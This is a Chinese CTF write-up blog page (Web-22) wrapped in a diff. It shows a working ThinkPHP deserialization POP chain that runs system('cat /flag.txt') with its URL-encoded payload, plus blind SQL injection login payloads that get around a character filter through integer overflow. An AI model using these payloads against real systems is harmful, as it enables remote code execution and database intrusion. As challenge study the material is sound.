@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="webEzpop题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？ 123456789101112131415161718192021222324252627282930&lt;?phpnamespace think&amp;#123;    abstract class Model&amp;#123;        private $l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web-22">
+<meta property="og:url" content="https://jlkl.github.io/2022/05/30/Web-22/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="webEzpop题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？ 123456789101112131415161718192021222324252627282930&lt;?phpnamespace think&amp;#123;    abstract class Model&amp;#123;        private $l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/bf8b148f-1524-4601-9f95-653bd7e877a8.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/20ad031e-436d-4b3e-8b20-942e4bffa63d.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/7e667985-ab12-4c32-bac5-1c905d3fdfeb.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.44.34.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.45.35.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.48.44.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.49.50.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.51.22.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/30/Web-22/e2412878-4605-4372-ac59-07ac64991751.png">
+<meta property="article:published_time" content="2022-05-30T08:26:29.000Z">
+<meta property="article:modified_time" content="2022-05-30T08:29:20.210Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2022/05/30/Web-22/bf8b148f-1524-4601-9f95-653bd7e877a8.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2022/05/30/Web-22/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Web-22 | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">45</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2022/05/30/Web-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web-22
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-30 16:26:29 / Modified: 16:29:20" itemprop="dateCreated datePublished" datetime="2022-05-30T16:26:29+08:00">2022-05-30</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2022/05/30/Web-22/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/30/Web-22/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>26 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> $data = [];</span><br><span class="line">        <span class="keyword">private</span> $exists = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $table;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">        <span class="keyword">protected</span> $json = [];</span><br><span class="line">        <span class="keyword">protected</span> $jsonAssoc = <span class="keyword">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">'whoami'</span> =&gt; [<span class="string">'cat /flag.txt'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'whoami'</span> =&gt; [<span class="string">'system'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">'whoami'</span>,[<span class="string">'whoami'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="keyword">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>zeh<span class="number">1</span><span class="keyword">c</span><span class="number">14</span><span class="keyword">i16</span><span class="keyword">ne</span><span class="number">6</span>hcxxxt.cloudec<span class="keyword">i1</span>.ichunqiu.com/index.php/?s=index/test</span><br><span class="line"></span><br><span class="line">a=O<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span>think<span class="symbol">%5</span>Cmodel<span class="symbol">%5</span>CPivot<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>lazySave<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>data<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span>cat+<span class="symbol">%2</span>Fflag.txt<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">19</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>exists<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>table<span class="symbol">%22</span><span class="symbol">%3</span>BO<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span>think<span class="symbol">%5</span>Cmodel<span class="symbol">%5</span>CPivot<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>lazySave<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>data<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span>cat+<span class="symbol">%2</span>Fflag.txt<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">19</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>exists<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>table<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>withAttr<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>system<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>json<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">2</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Bi<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">12</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>jsonAssoc<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>B<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>withAttr<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>system<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>json<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">2</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Bi<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">12</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>jsonAssoc<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+
+<h3 id="简单的渗透"><a href="#简单的渗透" class="headerlink" title="简单的渗透"></a>简单的渗透</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/login.php</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">58</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=df0d3e87a5da34d8dc5601b87508ebdb;</span> <span class="string">PHPSESSID=s195lkel6hhclv2gq2fhbst6ir</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"></span><br><span class="line"><span class="string">username=a%27%20or%201%20or%20%271%27=%271&amp;password=123456</span></span><br></pre></td></tr></table></figure>
+
+<p>参考虎符2022 - babysql<br>不同点在于后者过滤的东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $r = preg_replace(<span class="string">'/[\s,()#;*~\-]/'</span>,<span class="string">''</span>,$a);</span><br><span class="line">    $r = preg_replace(<span class="string">'/^.*(?=union|binary|regexp|rlike).*$/i'</span>,<span class="string">''</span>,$r);</span><br><span class="line">    <span class="keyword">return</span> (string)$r;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>按照之前的来说，之前的payload可以是这样</p>
+<blockquote>
+<p>参考之前我们写过的wp：<a href="https://demo.hedgedoc.org/uLxXjonDSMiRRO2o2P3deA#babysql" target="_blank" rel="noopener">https://demo.hedgedoc.org/uLxXjonDSMiRRO2o2P3deA#babysql</a></p>
+</blockquote>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||case'<span class="number">1</span>'when'<span class="number">1</span>'then'<span class="number">1</span>'else~<span class="number">0</span>+~<span class="number">0</span>+'<span class="number">1</span>'end='<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>这里我们同样构造200和500的不同回显来达到盲注的效果，上面的payload<br>是使用~0这个东西来达成sql语句报错从而回显500的效果。</p>
+<blockquote>
+<p><del>0是mysql里面最大的一个整数，如果这个数再加一就会报错下面的错误：<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in ‘(</del>(0) + 1)’</p>
+</blockquote>
+<p>我们再看看上面的过滤，过滤了<del>符号，那我们怎么报错呢？<br>我们可以看看具体</del>0是多少：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| ~0                   |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| 18446744073709551615 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>那我们直接使用这个数字不就行了？但是还有一个问题，空格怎么办？空格是被过滤掉的<br>如果直接使用18446744073709551615+1，那么payload长这样：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||case'<span class="number">1</span>'when'<span class="number">1</span>'then'<span class="number">1</span>'else <span class="number">18446744073709551615</span>+<span class="number">1</span> end='<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>里面是有2个空格的，但是直接’18446744073709551615’+’1’又不能整数溢出。其实我们想~其实是取反的符号，对0取反才达到了最大整数的效果，那么我们不仅有取反，还有异或等其他位操作，所以我们构造一个异或即可：<br>最后根据我们的虎符payload来直接开始爆破账号密码</p>
